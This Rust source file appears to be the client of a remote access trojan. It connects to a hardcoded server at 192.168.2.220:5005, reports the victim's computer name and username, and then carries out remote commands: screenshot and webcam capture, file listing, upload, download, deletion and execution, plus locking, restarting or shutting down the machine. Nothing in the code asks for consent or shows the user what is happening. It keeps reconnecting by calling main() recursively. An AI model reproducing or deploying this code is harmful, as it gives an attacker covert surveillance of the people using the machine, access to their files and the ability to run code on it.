#[allow(warnings)]

use std::io::{Result, Read, Write};
use std::net::TcpStream;

use components::message;
use components::lock;
use components::restart;
use components::shutdown;
use components::screenshot;
use components::webcam;
use components::files;

pub mod utilities;
mod components {
    pub mod message;
    pub mod lock;
    pub mod restart;
    pub mod shutdown;
    pub mod screenshot;
    pub mod webcam;
    pub mod files;
}

const SERVER : &str = "192.168.2.220";
const PORT : &str = "5005";

fn main() {
    match TcpStream::connect(format!("{}:{}", SERVER, PORT)) {
        Ok(mut stream) => {
            let computer_name = hostname::get().unwrap().into_string().unwrap().into_bytes();
            let username = whoami::username();

            let client_object = format!("{{\"computer_name\": \"{}\", \"username\": \"{}\"}}", String::from_utf8_lossy(&computer_name), username);
            let mut buffer = [0; 1024];

            stream.write_all(client_object.as_bytes()).unwrap();
            loop {
                match stream.read(&mut buffer) {
                    Ok(0) | Err(_) => {
                        println!("Connection closed");
                        main();
                    }
                    Ok(bytes_read) => {
                        let command = String::from_utf8_lossy(&buffer[0..bytes_read]);
                        
                        match command.trim() {
                            "ping" => {
                                stream.write_all("ping".as_bytes()).unwrap();
                            }
                            "append" => {
                                stream.write_all("append".as_bytes()).unwrap();
                                main();
                            }
                            "message" => message::vb_box(&stream),
                            "lock" => lock::lock_computer(&stream),
                            "restart" => restart::restart_computer(&stream),
                            "shutdown" => shutdown::shutdown_computer(&stream),
                            "screenshot" => screenshot::capture(&stream),
                            "webcam" => webcam::capture(&stream),
                            "drives" => files::get_drives(&stream),
                            "files" => files::get_files(&stream),
                            "upload-file" => files::upload(&stream),
                            "download-file" => files::download(&stream),
                            "delete-file" => files::delete(&stream),
                            "run-file" => files::run(&stream),

                            _ => {
                                main();
                            }
                        }
                    }
                }
            }
        }
        Err(_) => {
            main();
        }
    }
}